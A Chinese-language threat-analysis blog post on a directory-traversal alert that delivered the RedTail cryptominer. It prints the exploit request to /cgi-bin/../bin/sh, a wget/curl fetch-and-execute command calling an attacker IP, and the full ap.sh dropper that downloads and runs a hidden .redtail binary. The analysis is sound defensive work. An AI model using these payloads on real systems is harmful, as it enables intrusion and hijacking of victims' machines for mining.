ailx10说：这篇是在2024年5月之前写的，后来又改过。一条目录穿越告警里藏着 ap.sh，我顺着脚本追，看到 wget 不行就换 curl、按架构挑程序、找可写目录，再把 .redtail 隐藏着跑起来。继续往样本和沙箱看，UPX 卡住了一些分析，另一边却能从定时任务、外联和 JSON-RPC 任务流量认出挖矿的轮廓。这是我第一次和这个名字打照面，线索也不是一次就齐。于是文章把下载脚本、运行安排和可见通信放在同一条线上，留住它怎样从一段请求慢慢露出完整目的的过程。

---

最近告警分析，发现一个目录穿越，载荷比较有趣，分析如下：首先下载名为 `ap.sh` 的脚本，并使用 `sh` 命令执行它。如果 `wget` 下载失败，则使用 `curl` 来下载并执行，向`ap.sh`脚本传递参数`apache.selfrep`

```
POST /cgi-bin/../../../../../../../../../../bin/sh HTTP/1.1



wget http://193.222.96.163/ap.sh -O- | sh -s apache.selfrep || curl http://193.222.96.163/ap.sh | sh -s apache.selfrep
```

`ap.sh`脚本尝试根据系统架构，下载自适应的`.redtail` 的二进制文件并执行，`ap.sh`脚本内容如下：

```
#!/bin/bash



ARCH=$(uname -mp)

FILE=""



if echo "$ARCH" | grep -q "x86_64" || echo "$ARCH" | grep -q "amd64"; then

  FILE="x86_64"

elif echo "$ARCH" | grep -q "i[3456]86"; then

  FILE="i686"

elif echo "$ARCH" | grep -q "armv8" || echo "$ARCH" | grep -q "aarch64"; then

  FILE="aarch64"

elif echo "$ARCH" | grep -q "armv7"; then

  FILE="arm7"

fi



for i in /dev/shm /var/tmp /tmp; do

  if [ -w $i ] && cd $i && touch .testfile; then

    rm -rf .testfile

    break

  fi

done



rm -rf .redtail

wget http://193.222.96.163/"$FILE" -O .redtail || curl http://193.222.96.163/"$FILE" -o .redtail

chmod +x .redtail

./.redtail $1 >/dev/null 2>&1

```
